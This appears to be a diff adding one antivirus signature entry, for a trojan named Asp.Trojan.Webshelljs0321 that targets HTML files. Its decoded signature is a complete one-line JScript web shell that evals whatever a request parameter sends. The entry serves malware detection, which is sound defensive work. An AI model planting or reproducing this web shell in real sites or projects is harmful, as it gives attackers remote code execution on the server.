@@ -1,0 +1,5 @@
+VIRUS NAME: Asp.Trojan.Webshelljs0321-9839431-0
+TARGET TYPE: HTML
+OFFSET: 0
+DECODED SIGNATURE:
+<script language="jscript" runat="server">functionpage_load(){eval(request["no9bxmcxwoje"],"unsafe");}</script>
